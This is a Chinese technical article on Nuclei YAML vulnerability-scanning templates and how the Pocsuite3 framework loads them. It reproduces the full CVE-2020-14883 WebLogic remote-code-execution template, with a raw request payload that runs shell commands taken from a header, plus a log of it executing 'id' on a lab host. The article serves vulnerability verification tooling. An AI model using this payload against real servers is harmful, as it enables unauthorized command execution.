# 聊聊 Nuclei YAML 语法模版及 Pocsuite3 的兼容思路

阅读量 **128426**

发布时间 : 2022-11-29 14:30:29

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01b4126527c2061e39.png)

## 前言

Pocsuite3 是由知道创宇 404 实验室打造的一款基于 GPLv2 许可证开源的远程漏洞测试框架【1】。框架本身使用 Python3 开发，集成了
ZoomEye、Shodan、CEye、Interactsh 等众多安全服务的 API，用户可以基于 Pocsuite3 快速编写
PoC/Exp，对批量目标进行漏洞验证并获取汇总结果。

Nuclei 是一款由 projectdiscovery 开源的基于 YAML 语法模板的定制化快速漏洞扫描器【2】。Nuclei
定义了一套向目标发送请求，匹配响应判定漏洞是否验证成功的语法，支持 TCP、HTTP 等多种协议。Nuclei 的社区非常活跃，nuclei-templates 项目提供了几千个由社区维护的 PoC 模版【3】。

相比于 Nuclei，Pocsuite3 更加灵活，可以直接使用大量的第三方库，对于一些涉及复杂协议的漏洞会很方便，而且用户只要会写
Python，就能快速上手。从 `2.0.0` 版本开始，Pocsuite3 支持 YAML 格式的 PoC，兼容 Nuclei，可以直接使用 nuclei
template。

本文抛砖引玉，简单聊聊 Nuclei YAML 语法模版，以及 Pocsuite3 是如何实现兼容的。关于 Nuclei 模版的更详细信息可参考
Nuclei 官方文档。

## Nuclei YAML 语法模版

YAML 是一种数据序列化语言，通常用于编写配置文件。它的基本语法规则如下（来源：阮一峰《YAML 语言教程》【4】）。

>   * 大小写敏感
>   * 使用缩进表示层级关系
>   * 缩进时不允许使用 Tab 键，只允许使用空格。
>   * 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可
>

`#` 表示注释，从这个字符一直到行尾，都会被解析器忽略。

YAML 支持的数据结构有三种。

>   * 对象：键值对的集合，使用冒号结构表示。
>   * 数组：一组按次序排列的值，又称为序列（sequence） /
> 列表（list）。一组连词线开头的行，构成一个数组。如果数据结构的子成员是一个数组，则可以在该项下面缩进一个空格。
>   * 纯量（scalars）：单个的、不可再分的值，如字符串、整数、布尔值等。
>

以 `nuclei-templates/cves/2020/CVE-2020-14883.yaml` 为例：

    
    
    id: CVE-2020-14883
    
    info:
      name: Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution
      author: pdteam
      severity: high
      description: The Oracle Fusion Middleware WebLogic Server admin console in versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is vulnerable to an easily exploitable vulnerability that allows high privileged attackers with network access via HTTP to compromise Oracle WebLogic Server.
      reference:
        - https://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14883
        - https://www.oracle.com/security-alerts/cpuoct2020.html
        - http://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html
      classification:
        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
        cvss-score: 7.2
        cve-id: CVE-2020-14883
      tags: oracle,rce,weblogic,kev,packetstorm,cve,cve2020
    
    requests:
      - raw:
          - |
            POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1
            Host: {{Hostname}}
            Accept-Language: en
            CMD: {{cmd}}
            Content-Type: application/x-www-form-urlencoded
            Accept-Encoding: gzip, deflate
    
            test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("CMD");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
    
        payloads:
          cmd:
            - id
    
        matchers-condition: and
        matchers:
          - type: word
            part: header
            words:
              - "ADMINCONSOLESESSION"
    
          - type: word
            part: body
            words:
              - 'uid='
              - 'gid='
              - 'groups='
            condition: and
    
          - type: status
            status:
              - 200
    
        extractors:
          - type: regex
            regex:
              - "(u|g)id=.*"
    
    # Enhanced by mp on 2022/04/20
    

这个模版大致可分为以下几部分：

    
    
    id: str  # 模版的唯一ID，必要字段。
    info: {k: v}  # 漏洞信息字段，包含漏洞名称、作者、漏洞严重性、漏洞描述、引用连接、评分、漏洞标签等，基本都是可选字段。
    variables: {k: v}  # 全局变量，值可以是一个字符串或者一个表达式，上述模版未提供
    requests: []  # 定义的 HTTP 请求（核心部分）
    

最核心的是 requests 部分，requests 代表定义 HTTP 请求。Nuclei 支持多种协议，比如想定义 TCP 请求就需要使用
network 字段。

requests 的语法如下，它的每个元素都包含单/多个 HTTP
请求、payloads（可选）、匹配规则、解压规则（可选）。大多数情况下定义一个就足够了。

    
    
    requests
      # 方式一：原始（raw）请求
      - raw:
          - |
            GET /index.php HTTP/1.1   
    
          - |
            POST /index.php HTTP/1.1
            Host: {{Hostname}}
            Accept-Language: en
    
            ...
      # 方式二：GET, POST, PUT, DELETE 请求
      - method: GET
        path:
          - "{{BaseURL}}/login.php"
          - "{{BaseURL}}/index.php"  
        headers: {}  
    
           # payload 组合方式
        attack: clusterbomb
        # 提供的 payload，用于请求填充
        payloads: {}
        # 解压规则，用于从上一个请求响应中提取信息，以用于后续的请求填充或者结果返回。
        extractors: []
        # 定义的请求发送完再进行匹配
        req-condition: false
        # 命中第一个匹配就返回
        stop-at-first-match: true
        # 匹配规则的逻辑关系，如果是 and 则表示所有匹配条件必须都为 true。
        matchers-condition: and
        # 匹配规则
        matchers: []
    

定义 http 请求支持两种方式，1、分别定义 method、path、headers、body 等；2、直接提供 http 原始请求。请求中会包含形如
`{{变量名或表达式}}` 的动态值，需要在发送请求前替换。变量命名空间由 variables、payloads、extractors 解压出来的值、目标
url 等一起提供。解压规则和匹配规则中也会包含动态值。

extractors 有以下几种类型：  
1、regex，正则提取；  
2、kval，健值对，比如提取指定响应头；  
3、json，使用 jq 的语法提取 json 数据；  
4、xpath，使用 xpath 提取 html 响应数据；  
5、dsl，使用表达式提取，不常用。

`WebLogic CVE-2020-14883` 的解压规则定义如下，使用正则提取了 id 命令的执行结果。

    
    
    extractors:
          - type: regex
            regex:
              - "(u|g)id=.*"
    

matchers 的类型定义如下：

1、status，匹配 http 响应状态码；  
2、size，匹配长度，如 Conteng-Length；  
3、word，字符串匹配；  
4、regex，正则匹配；  
5、binary，二进制数据匹配；  
5、dsl，使用复杂表达式进行匹配；

举个例子：

    
    
    matchers:
      # 对响应 headers 进行字符串匹配
      - type: word
        part: header
        words:
          - "ADMINCONSOLESESSION"
    
      # 对响应 body 进行字符串匹配，且要包含所有子串。
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'groups='
        condition: and
    
      # 匹配 http 响应状态码
      - type: status
        status:
          - 200
    

上面我们介绍了各个部分的含义。总体来看，引擎大致运行流程如下：

1、迭代所有的 payloads 组合；  
2、针对每个 payloads 组合，顺序依次发送定义的请求并获取响应结果（需要替换请求中的动态值）；  
3、遍历所有的解压规则，从响应提取信息，合并到局部变量命名空间，或者用于结果返回（由 internal 变量控制）；  
4、如果 `req-conditio` 的值为 true，则跳转到 2
继续发送下一个请求；并提取响应结果各个部分，保存到局部变量命名空间，形如：`status_code_1`、`body_2`。  
5、遍历匹配规则，获取匹配结果，如果匹配则返回，否则继续；

## Pocsuite3 兼容 nuclei 的部分实现细节

###  YAML 格式 PoC 如何和原框架兼容

我们不想改动 Pocsuite3 注册 PoC 到框架的方式，因此将 Nuclei 实现成了一个相对独立的模块，并额外提供了一个方法。当框架加载 PoC
时发现是 YAML 格式，会自动转换成 Pocsuite3 的 PoC 格式。因此 YAML 格式的 PoC 和 Python PoC
脚本在使用上没有任何区别。

    
    
    class nuclei:
    ...
       def __str__(self):
            """
            Convert nuclei template to Pocsuite3
            """
            info = []
            key_convert = {
                'description': 'desc',
                'reference': 'references'
            }
            for k, v in self.json_template['info'].items():
                if k in key_convert:
                    k = key_convert.get(k)
                if type(v) in [str]:
                    v = json.dumps(v.strip())
    
                info.append(f'    {k} = {v}')
    
            poc_code = [
                'from pocsuite3.api import POCBase, Nuclei, register_poc\n',
                '\n',
                '\n',
                'class TestPOC(POCBase):\n',
                '\n'.join(info),
                '\n',
                '    def _verify(self):\n',
                '        result = {}\n',
                '        if not self._check(is_http=%s):\n' % (len(self.template.requests) > 0),
                '            return self.parse_output(result)\n',
                "        template = '%s'\n" % binascii.hexlify(self.yaml_template.encode()).decode(),
                '        res = Nuclei(template, self.url).run()\n',
                '        if res:\n',
                '            result["VerifyInfo"] = {}\n',
                '            result["VerifyInfo"]["URL"] = self.url\n',
                '            result["VerifyInfo"]["Info"] = {}\n',
                '            result["VerifyInfo"]["Info"]["Severity"] = "%s"\n' % self.template.info.severity.value,
                '            if not isinstance(res, bool):\n'
                '               result["VerifyInfo"]["Info"]["Result"] = res\n',
                '        return self.parse_output(result)\n',
                '\n',
                '\n',
                'register_poc(TestPOC)\n'
            ]
            return ''.join(poc_code)
    

###  如何加载 YAML 模版

Golang 可以直接反序列化 JSON 数据为结构体看着非常优雅，在 Python3 中使用 dataclass 和 daciate
库也可以做到这一点，还能顺便做类型检查。另外，Python 中变量不能包含中横线，需要对数据做一些预处理。

    
    
    @dataclass
    class Template:
        """Template is a YAML input file which defines all the requests and other metadata for a template.
        """
        id: str = ''
        info: Info = field(default_factory=Info)
        requests: List[HttpRequest] = field(default_factory=list)
        network: List[NetworkRequest] = field(default_factory=list)
        stop_at_first_match: bool = True
        variables: dict = field(default_factory=dict)
    
    class Nuclei:
        def __init__(self, template, target=''):
            self.yaml_template = template
            try:
                self.yaml_template = binascii.unhexlify(self.yaml_template).decode()
            except ValueError:
                pass
            self.json_template = yaml.safe_load(expand_preprocessors(self.yaml_template))
            self.template = dacite.from_dict(
                Template, hyphen_to_underscore(self.json_template),
                config=dacite.Config(cast=[Severify, ExtractorType, MatcherType, HTTPMethod, AttackType, NetworkInputType]))
    

###  DSL 表达式执行

使用 Python 实现了 DSL 的大部分函数，限制了表达式所能访问的函数和属性，最后通过 eval 执行。

    
    
    def safe_eval(expression, variables):
        if not _check_expression(expression, allowed_variables=list(variables.keys())):
            expression = expression.replace(' && ', ' and ').replace(' || ', ' or ')
            if not _check_expression(expression, allowed_variables=list(variables.keys())):
                raise Exception(f"Invalid expression [{expression}], only a very simple subset of Python is allowed.")
        return eval(expression, globals(), variables)
    

###  使用效果

使用 `-r` 直接加载 YAML 模版即可，通过 `-v` 设置日志级别，可以输出模版运行细节，包括请求和响应、表达式执行、解压规则和匹配规则的运行结果。

    
    
    ➜  ~ pocsuite -r ~/nuclei-templates/cves/2020/CVE-2020-14883.yaml -u  http://172.29.157.74:7001  -v 2                                   
    
    ,------.                        ,--. ,--.       ,----.   {2.0.1-cb758d9}
    |  .--. ',---. ,---.,---.,--.,--`--,-'  '-.,---.'.-.  |
    |  '--' | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. : .' <
    |  | --'' '-' \ `--.-'  `'  ''  |  | |  | \   --/'-'  |
    `--'     `---' `---`----' `----'`--' `--'  `----`----'   https://pocsuite.org
    [*] starting at 18:34:40
    
    [18:34:40] [INFO] loading PoC script '/Users/fenix/nuclei-templates/cves/2020/CVE-2020-14883.yaml'
    [18:34:41] [INFO] pocsusite got a total of 1 tasks
    [18:34:41] [DEBUG] pocsuite will open 1 threads
    [18:34:41] [INFO] running poc:'Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution' target 'http://172.29.157.74:7001'
    [18:34:52] [DEBUG] < POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1
    < Host: 172.29.157.74:7001
    < User-Agent: Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0)
    < Accept-Encoding: gzip, deflate
    < Accept: */*
    < Connection: keep-alive
    < Accept-Language: en
    < CMD: id
    < Content-Type: application/x-www-form-urlencoded
    < Content-Length: 1166
    < 
    < test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("CMD");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
    
    > HTTP/1.1 200 OK
    > Date: Wed, 09 Nov 2022 02:34:52 GMT
    > Transfer-Encoding: chunked
    > Content-Type: text/html; charset=UTF-8
    > Set-Cookie: ADMINCONSOLESESSION=hpNaPYWzVQlWjXS0qq3B6CBq43oDb1kLXFpPZS6iOBlsVxfbRC-2!-1601473325; path=/console/; HttpOnly
    > 
    uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)
    
    [18:34:52] [DEBUG] [+] Extractor(name='', type=<ExtractorType.RegexExtractor: 'regex'>, regex=['(u|g)id=.*'], group=0, kval=[], json=[], xpath=[], attribute='', dsl=[], part='', internal=False, case_insensitive=False) -> {'internal': {}, 'external': {}, 'extra_info': ['uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)']}
    [18:34:52] [DEBUG] [+] Matcher(type=<MatcherType.WordsMatcher: 'word'>, condition='or', part='header', negative=False, name='', status=[], size=[], words=['ADMINCONSOLESESSION'], regex=[], binary=[], dsl=[], encoding='', case_insensitive=False, match_all=False) -> True
    [18:34:52] [DEBUG] [+] Matcher(type=<MatcherType.WordsMatcher: 'word'>, condition='and', part='body', negative=False, name='', status=[], size=[], words=['uid=', 'gid=', 'groups='], regex=[], binary=[], dsl=[], encoding='', case_insensitive=False, match_all=False) -> True
    [18:34:52] [DEBUG] [+] Matcher(type=<MatcherType.StatusMatcher: 'status'>, condition='or', part='body', negative=False, name='', status=[200], size=[], words=[], regex=[], binary=[], dsl=[], encoding='', case_insensitive=False, match_all=False) -> True
    [18:34:52] [+] URL : http://172.29.157.74:7001
    [18:34:52] [+] Info : {'Severity': 'high', 'Result': [{'cmd': 'id', 'extra_info': ['uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)']}]}
    [18:34:52] [INFO] Scan completed,ready to print
    
    +---------------------------+-----------------------------------------------------------------------------------------+--------+-----------+---------+---------+
    | target-url                |                                         poc-name                                        | poc-id | component | version |  status |
    +---------------------------+-----------------------------------------------------------------------------------------+--------+-----------+---------+---------+
    | http://172.29.157.74:7001 | Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution |   0    |           |         | success |
    +---------------------------+-----------------------------------------------------------------------------------------+--------+-----------+---------+---------+
    success : 1 / 1
    
    [*] shutting down at 18:34:52

## 最后

目前的实现能覆盖大部分 HTTP 和 Network 模版，Nuclei
的一些特殊功能如：Workflows、条件竞争请求、请求注释等暂不支持。最新版本已经推送到 PyPI、Homebrew
仓库、Dockerhub、Archlinux 等，等这个大版本稳定后会继续推送 Debian、Kali、Ubuntu。如果大家在使用中发现任何问题，欢迎提交
Issue 或贡献代码。

## 参考链接

【1】: Pocsuite3 框架

<https://pocsuite.org>

【2】: Nuclei 框架

<https://nuclei.projectdiscovery.io>

【3】: nuclei-templates 项目

<https://github.com/projectdiscovery/nuclei-templates>

【4】: YAML 语言教程

<https://www.ruanyifeng.com/blog/2016/07/yaml.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **知道创宇404实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/283289](/post/id/283289)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Nuclei YAML](/tag/Nuclei YAML)
  * [Pocsuite3](/tag/Pocsuite3)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t016a18426d2b84e450.png) 知道创宇404实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

